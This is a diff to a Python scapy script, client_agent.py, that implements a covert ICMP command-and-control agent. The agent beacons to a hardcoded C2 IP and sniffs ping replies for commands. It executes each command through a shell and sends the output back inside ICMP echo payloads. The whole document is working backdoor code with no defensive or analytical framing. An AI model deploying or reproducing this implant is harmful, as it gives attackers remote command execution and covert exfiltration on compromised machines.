@@ -1,42 +1,74 @@
 # client_agent.py
 from scapy.all import *
-import os
+import threading
 import time
+import os
+import subprocess
+import random
+import string
 
-C2_IP = "192.168.1.100"  # C2 server IP
-AGENT_ID = os.urandom(2).hex()  # Unique-ish agent ID
+C2_IP = "192.168.10.50"  # Change to your C2 server IP
+AGENT_ID = ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
+BEACON_INTERVAL = 5  # seconds
 SEQ = 0
 
+lock = threading.Lock()
+
 def send_beacon():
-    payload = f"{AGENT_ID}|BEACON|0|IDLE"
-    reply = sr1(IP(dst=C2_IP)/ICMP(type=8)/payload, timeout=2, verbose=0)
-    return reply
+    payload = f"{AGENT_ID}|BEACON|0|"
+    send(IP(dst=C2_IP)/ICMP(type=8)/payload, verbose=0)
 
-def send_result(seq, data):
-    payload = f"{AGENT_ID}|RESULT|{seq}|{data}"
-    sr1(IP(dst=C2_IP)/ICMP(type=8)/payload, timeout=2, verbose=0)
+def send_result(seq, result_text):
+    payload = f"{AGENT_ID}|RESULT|{seq}|{result_text}"
+    send(IP(dst=C2_IP)/ICMP(type=8)/payload, verbose=0)
 
-def start_agent():
-    print(f"[*] Agent {AGENT_ID} started. Beaconing to {C2_IP}...")
+def execute_command(command):
+    """Execute a shell command and return its output as string."""
+    try:
+        # Run the command in the shell and capture stdout + stderr
+        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+        return output.decode("utf-8", errors="ignore")  # decode bytes to string
+    except subprocess.CalledProcessError as e:
+        return f"Error: {e.output.decode('utf-8', errors='ignore')}"
+    except Exception as e:
+        return f"Error: {str(e)}"
+
+def handle_reply(pkt):
     global SEQ
+    if pkt.haslayer(ICMP) and pkt[ICMP].type == 0 and Raw in pkt:
+        payload = pkt[Raw].load.decode(errors="ignore")
+        fields = payload.split("|", 3)
+        if len(fields) < 4:
+            return
+        agent_id, msg_type, seq_str, data = fields
+        if agent_id != AGENT_ID:
+            return
+
+        msg_type = msg_type.strip()
+        data = data.strip()
+
+        if msg_type == "CMD":
+            # Execute the command
+            result = execute_command(data)
+            with lock:
+                send_result(SEQ, result)
+                SEQ += 1
+
+        elif msg_type == "NO_CMD":
+            pass  # Nothing to do
+        elif msg_type == "ACK":
+            pass  # Server acknowledged result
+
+def start_sniffer():
+    sniff(filter="icmp", prn=handle_reply)
+
+def beacon_loop():
     while True:
-        reply = send_beacon()
-        if reply and reply.haslayer(Raw):
-            fields = reply[Raw].load.decode(errors="ignore").split("|", 3)
-            if len(fields) < 4:
-                continue
-            _, msg_type, _, data = fields
-            if msg_type == "CMD" and data:
-                print(f"[+] Received command: {data}")
-                try:
-                    result = os.popen(data).read().strip()
-                except Exception as e:
-                    result = f"ERROR: {e}"
-                chunks = [result[i:i+512] for i in range(0, len(result), 512)]
-                for i, chunk in enumerate(chunks):
-                    send_result(SEQ + i, chunk)
-                SEQ += len(chunks)
-        time.sleep(5)
+        send_beacon()
+        time.sleep(BEACON_INTERVAL)
 
 if __name__ == "__main__":
-    start_agent()
+    threading.Thread(target=start_sniffer, daemon=True).start()
+    beacon_loop()
+
+
